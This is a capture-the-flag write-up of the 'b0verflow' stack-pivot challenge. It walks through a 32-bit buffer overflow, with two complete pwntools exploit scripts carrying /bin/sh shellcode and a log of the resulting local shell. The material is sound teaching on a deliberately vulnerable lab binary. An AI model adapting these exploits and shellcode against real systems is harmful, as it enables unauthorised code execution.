## b0verflow 

This challenge is related to a technique called stack pivot. 

I decided to study and write a post about stack pivots before solving the pivot challenge from ropemporium.

You can access the binary from [nightmare](https://github.com/guyinatuxedo/nightmare).

The binary is in the the `17-stack_pivot` directory.

Let's run `file` and `checksec`.

```
$ file b0verflow 
b0verflow: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=9f2d9dc0c9cc531c9656e6e84359398dd765b684, not stripped
```

```
$ checksec b0verflow
[*] '/home/hwkim301/nightmare/modules/17-stack_pivot/xctf16_b0verflow/b0verflow'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x8048000)
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
```

It's a 32 bit executable and none of the security features are enabled.

Checkout the disassembly using ghidra/IDA. 

Here's the `main` function, it calls `vul`.

```c
void main(void)
{
  vul();
  return;
}
```

This is `vul`. 

The program has a buffer overflow because it reads 50 bytes of data using `fgets` when the buffer is 32 bytes.

```c
undefined4 vul(void)
{
  char local_24 [32];
  
  puts("\n======================");
  puts("\nWelcome to X-CTF 2016!");
  puts("\n======================");
  puts("What\'s your name?");
  fflush(stdout);
  fgets(local_24,0x32,stdin);
  printf("Hello %s.",local_24);
  fflush(stdout);
  return 1;
}
```

The offset to the return address is 36 bytes.

There is a slight problem. 

Since the program only reads 50 bytes, we only have 14 bytes to execute shellcode or call another function.

Shellcodes are generally 30 bytes long so overwriting the return address and executing the shellcode isn't a viable option.

If you look closely at the functions in the binary, you'll be able to spot a `hint` function.

Although it doesn't seem to do something significant, let's look at the disassembly in gdb. 

```c
void hint(void)
{
  return;
}
```

Like any other function it starts of with a function prologue and then executes a `jmp esp`, `ret` instruction.

```
gef➤  disass hint
Dump of assembler code for function hint:
   0x080484fd <+0>:	push   ebp
   0x080484fe <+1>:	mov    ebp,esp
   0x08048500 <+3>:	sub    esp,0x24
   0x08048503 <+6>:	ret
   0x08048504 <+7>:	jmp    esp
   0x08048506 <+9>:	ret
   0x08048507 <+10>:	mov    eax,0x1
   0x0804850c <+15>:	pop    ebp
   0x0804850d <+16>:	ret
End of assembler dump.
```

So what we can do is fill the buffer overwrite the saved frame pointer and execute the `jmp esp` instruction from the `hint` function.

Now the instruction pointer will point to the the `esp`.

Since we can't directly execute shellcode, what if we can decrease the stack pointer so that it points to the shellcode and execute it there. 

Here's the pwntools code. 

```python
from pwn import * 

p=process('./b0verflow')

jmp_esp=0x08048504
shellcode=b'\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80' 

payload=shellcode
payload=payload.ljust(0x20,b'A')
payload+=b'A'*4
payload+=p32(jmp_esp)
payload+=asm('sub esp, 0x28; jmp esp')

p.sendline(payload)
p.interactive()

```

Although the exploit code is quite intuitive, I found it a bit hard that you have to manually execute 
`sub esp, 0x28; jmp esp` using the `asm` function in pwntools. 

Personally although the solution is very clear, I think it's a bit of a stretch for one to write assembly instructions like so. 

Even if you can calculate the precise offset, you still have to think outside of the box to write that line of assembly. 

This is the solution I slightly modified from [ctf-wiki](https://ctf-wiki.org/en/pwn/linux/user-mode/stackoverflow/x86/fancy-rop/#1).

Running the pwntools code will get you a shell. 

```
$ python solve.py
[+] Starting local process './b0verflow': pid 10347
[*] Switching to interactive mode

======================

Welcome to X-CTF 2016!

======================
What's your name?
Hello 1\xc9j\x0bXQh//shh/bin\x89\xe3̀AAAAAAAAAAAAAAAA\x04\x85\x04\x08\x83\xec(\xff\xe4
.$ id
uid=1000(hwkim301) gid=1000(hwkim301) groups=1000(hwkim301),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),114(lpadmin)
```

The exploit code from Nightmare is completely different. 

BTW, I slightly modified the exploit code. 

[Here](https://www.exploit-db.com/exploits/46809) is the shellcode I referenced. 

Unlike the first code, where the CPU executes in the exact order as written in the Pwntools script, this one doesn't.

To understand the exploit, you need to realize that although the stack grows from high to low addresses, functions/syscalls like `read`, `write`, `scanf`, and `printf` always write from low to high addresses. 

This directional mismatch is the fundamental reason why stack buffer overflows occur.

```python
from pwn import *

p = process('./b0verflow')

# gdb.attach(p, gdbscript = 'b *0x080485a0')

shellcode = b'\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80' 

# 0x08048504 : jmp esp
jmp_esp = p32(0x08048504)

# 0x080484fd : push ebp ; mov ebp, esp ; sub esp, 0x24 ; ret
pivot = p32(0x080484fd)

payload = jmp_esp                        # Our jmp esp gadget at the start of the buffer
payload += shellcode                     # Our shellcode
payload += b'A' * (0x20 - len(shellcode)) # Filler to reach Saved EBP
payload += pivot                         # Overwriting the Return Address
```

Another crucial point although we send the entire payload at once, the CPU executes it non-linearly.

During the epilogue of vul:

`mov esp, ebp` resets the stack pointer to match the base pointer.

`pop ebp` restores the previous frame pointer and increments esp by 4 bytes (1 DWORD).

`ret` pops the return address into `eip` and resumes execution, incrementing `esp` by another 4 bytes.

In x86, the leave instruction combines mov esp, ebp and pop ebp. 

The end of `vul` uses `leave; ret`.

```
0x0804859f <+132>:  leave
0x080485a0 <+133>:  ret
```

Now, let's look back at the payload layout.

Although `jmp esp` sits at the very beginning of the payload, it is not executed first. 

The first code executed from our payload is the pivot gadget stored at the return address `ebp + 4`.

Which will mostly be correct, unless the stack is optimized by GCC. 

```
0x080484fd <+0>:    push   ebp
0x080484fe <+1>:    mov    ebp, esp
0x08048500 <+3>:    sub    esp, 0x24
0x08048503 <+6>:    ret
```

Normally, after `vul`'s `ret` instruction finishes, `esp` moves up to a higher address (past the return address). 

However, by hijacking control flow with the pivot gadget, `sub esp, 0x24` subtracts 36 bytes from esp, pulling the stack pointer back down to lower addresses—specifically right back to the beginning of our buffer where `jmp esp` resides.

When the pivot gadget hits its own ret at <+6>, it pops `jmp esp` into eip.

Executing `jmp esp` then jumps directly to the shellcode that immediately follows `jmp esp` in the buffer, popping a shell. 

I personally think that the nightmare's code is more accessible because it only uses the gadgets that are present in the binary, however the downside of it is that it's takes a lot of effort to understand how the exploit works. 

The writeup from ctf-wiki is intuitive, but from my perspective I don't think someone who doesn't have any experience will be able to write `asm('sub esp, 0x28; jmp esp')` without any hints. 

Nightmare also extensively uses gdb so it would be great to get comfortable with gdb. 

In conclusion they both have some pros and cons. 